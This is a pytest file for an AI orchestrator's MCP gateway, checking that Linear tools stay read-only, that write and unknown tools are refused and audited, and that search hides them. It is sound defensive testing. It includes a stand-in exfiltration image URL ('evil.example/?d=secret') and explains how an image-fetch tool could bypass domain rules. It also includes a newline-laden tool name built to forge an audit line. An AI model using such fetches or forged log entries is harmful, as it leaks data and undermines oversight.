"""Linear is connected read-only, and the gateway is where that is enforced.

Deploy-side, read-only rests on two facts nothing in this repo can see: the
configured URL is Linear's `/mcp/readonly` endpoint, and the API key is
Read-scoped. `_LINEAR_READ_TOOLS` is the code-side half — a fail-closed
allow-list of the 35 reads that endpoint serves. These tests pin both halves of
the guarantee: `call_tool` refuses any other `linear__` name, and
`search_tools` never offers one.
"""
from __future__ import annotations

import asyncio
import json
from types import SimpleNamespace
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

import openexecutive.orchestrator.mcp_gateway as gw_module
from openexecutive.orchestrator.mcp_gateway import (
    _LINEAR_PREFIX,
    _LINEAR_READ_TOOLS,
    MCPGateway,
    _is_blocked_linear_tool,
)

EXEC_ADDR = "exec@example.com"


@pytest.fixture(autouse=True)
def silence_audit(monkeypatch: pytest.MonkeyPatch) -> None:
    """A refusal writes an audit row; keep it out of ./episodic_memory.db."""
    monkeypatch.setattr("openexecutive.audit.log_event", lambda *a, **k: None)


def _settings() -> Any:
    return SimpleNamespace(exec_email_address=EXEC_ADDR, email_poll_interval_seconds=60)


def _make_gateway() -> tuple[MCPGateway, AsyncMock]:
    gateway = MCPGateway()
    session = MagicMock()
    fake_result = MagicMock()
    fake_result.content = [MagicMock(text='{"ok": true}')]
    session.call_tool = AsyncMock(return_value=fake_result)
    gateway._session = session
    return gateway, session.call_tool


def _call(gateway: MCPGateway, tool_name: str, arguments: dict[str, Any] | None = None) -> str:
    with patch.object(gw_module, "get_settings", return_value=_settings()):
        return asyncio.run(gateway.call_tool({"name": tool_name, "arguments": arguments or {}}))


def _blocked(result: str) -> bool:
    return "error" in json.loads(result)


def _error(result: str) -> str:
    return str(json.loads(result)["error"])


def _search_block(name: str) -> str:
    return (
        f"## {name}\n**Description:** does {name}\n**Parameters:**\n"
        '```json\n{"type": "object"}\n```\n**Similarity:** 0.5\n\n'
    )


# --- the allow-list itself --------------------------------------------------


def test_allow_list_holds_the_observed_read_surface() -> None:
    """34 of the 35 names the read-only endpoint served on 2026-10-13, every
    one a plain read. A name here that is not a `get_`/`list_`/`search_` would
    mean the list grew by guesswork, or that something which only looks like a
    read (see `extract_images` below) was admitted without an argument gate."""
    assert len(_LINEAR_READ_TOOLS) == 34
    assert all(name.startswith(("get_", "list_", "search_")) for name in _LINEAR_READ_TOOLS)


def test_extract_images_is_excluded_because_it_fetches_caller_chosen_urls() -> None:
    """`extract_images` is on the read-only endpoint but takes only a caller-
    written `markdown` string and fetches the image URLs in it, so it is a
    server-side fetch with an arbitrary target — the shape `_check_url_fetch`
    refuses on the Google surface, and a way past `web_fetch`'s domain rules.
    It is excluded on purpose, not forgotten."""
    assert "extract_images" not in _LINEAR_READ_TOOLS
    gateway, session_call = _make_gateway()
    result = _call(gateway, "linear__extract_images", {"markdown": "![x](https://evil.example/?d=secret)"})
    assert _blocked(result)
    assert session_call.await_count == 0


# --- call_tool -------------------------------------------------------------


@pytest.mark.parametrize("bare", sorted(_LINEAR_READ_TOOLS))
def test_every_allow_listed_read_passes_the_gate(bare: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, _LINEAR_PREFIX + bare, {"teamId": "NEM"})
    assert result == '{"ok": true}'
    assert session_call.await_count == 1


@pytest.mark.parametrize("bare", ["create_issue", "update_issue"])
def test_known_write_tools_are_refused_and_told_not_to_retry(bare: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, _LINEAR_PREFIX + bare, {"title": "ship it"})
    assert _blocked(result)
    assert session_call.await_count == 0
    error = _error(result)
    assert "read-only" in error
    assert "Do not retry" in error


def test_an_unknown_linear_tool_is_refused_because_the_list_fails_closed() -> None:
    """The point of the chunk: a `linear__` name on neither the read list nor
    any write list we thought of is refused, so a tool Linear ships tomorrow —
    or anything a repointed `/mcp` URL would expose — cannot run until someone
    adds it to `_LINEAR_READ_TOOLS` on purpose."""
    gateway, session_call = _make_gateway()
    result = _call(gateway, "linear__some_tool_nobody_has_vetted", {})
    assert _blocked(result)
    assert session_call.await_count == 0
    assert "read-only" in _error(result)


def test_a_respelled_write_tool_is_refused_too() -> None:
    """Names are read through `_normalize_tool_name`, so case and hyphen drift
    cannot walk a write tool past the prefix check."""
    assert _is_blocked_linear_tool("Linear__Create-Issue")
    assert _is_blocked_linear_tool("LINEAR__create_issue")


def test_the_refusal_is_audited_as_a_blocked_outbound_call(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    rows: list[tuple[str, dict[str, Any]]] = []
    monkeypatch.setattr(
        "openexecutive.audit.log_event",
        lambda kind, _summary, **kw: rows.append((kind, kw.get("details", {}))),
    )
    gateway, _ = _make_gateway()
    _call(gateway, "linear__create_issue", {})
    assert rows == [(
        "integration_outbound_blocked",
        {"tool": "linear__create_issue", "field": "tool", "address": "<linear-write>"},
    )]


def test_a_crafted_tool_name_cannot_forge_a_second_audit_line() -> None:
    """The gate refuses by prefix, so everything after `linear__` is the
    caller's. A newline in it would forge a line in the audit summary, and a
    huge name would bloat the row: `_refuse` flattens and truncates both."""
    summaries: list[str] = []
    rows: list[dict[str, Any]] = []
    with patch(
        "openexecutive.audit.log_event",
        lambda _kind, summary, **kw: (summaries.append(summary), rows.append(kw.get("details", {}))),
    ):
        gateway, session_call = _make_gateway()
        forged = "linear__x\nBlocked a Google Workspace call (tool=send_gmail_message field=to)"
        _call(gateway, forged + "A" * 5000, {})
    assert session_call.await_count == 0
    assert len(summaries) == 1 and "\n" not in summaries[0]
    assert len(rows[0]["tool"]) <= 200 and "\n" not in rows[0]["tool"]


def test_the_refusal_names_linear_rather_than_google_workspace(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A Linear refusal must not read as a Google Workspace egress block —
    /audit is searched by that text."""
    summaries: list[str] = []
    monkeypatch.setattr(
        "openexecutive.audit.log_event",
        lambda _kind, summary, **_kw: summaries.append(summary),
    )
    gateway, _ = _make_gateway()
    _call(gateway, "linear__create_issue", {})
    assert summaries == ["Blocked a Linear call (tool=linear__create_issue field=tool)"]


# --- other servers are unaffected ------------------------------------------


def test_a_non_linear_tool_name_is_unaffected() -> None:
    gateway, session_call = _make_gateway()
    assert not _is_blocked_linear_tool("notion__create_page")
    result = _call(gateway, "notion__create_page", {"title": "x"})
    assert result == '{"ok": true}'
    assert session_call.await_count == 1


def test_a_server_whose_name_merely_starts_with_linear_is_unaffected() -> None:
    """The prefix is the whole namespace separator, so another server is not
    swept into Linear's allow-list by sharing its first letters."""
    assert not _is_blocked_linear_tool("linearb__create_report")


@pytest.mark.parametrize("tool_name", [None, 42, ["linear__create_issue"], {"a": 1}])
def test_a_non_str_tool_name_does_not_crash_the_check(tool_name: object) -> None:
    assert _is_blocked_linear_tool(tool_name) is False


# --- search_tools ----------------------------------------------------------


def test_search_results_never_offer_a_blocked_linear_tool() -> None:
    gateway, session_call = _make_gateway()
    text = "Found 4 tools:\n\n" + "".join(
        _search_block(n) for n in (
            "linear__list_issues",
            "linear__create_issue",
            "linear__get_team",
            "linear__some_tool_nobody_has_vetted",
        )
    )
    session_call.return_value.content = [MagicMock(text=text)]
    out = asyncio.run(gateway.search_tools({"query": "linear issues"}))
    assert "linear__list_issues" in out and "linear__get_team" in out
    assert "linear__create_issue" not in out
    assert "linear__some_tool_nobody_has_vetted" not in out


def test_search_results_without_a_blocked_linear_tool_come_back_byte_identical() -> None:
    gateway, session_call = _make_gateway()
    text = "Found 2 tools:\n\n" + "".join(
        _search_block(n) for n in ("linear__list_issues", "linear__list_comments")
    )
    session_call.return_value.content = [MagicMock(text=text)]
    assert asyncio.run(gateway.search_tools({"query": "linear issues"})) == text
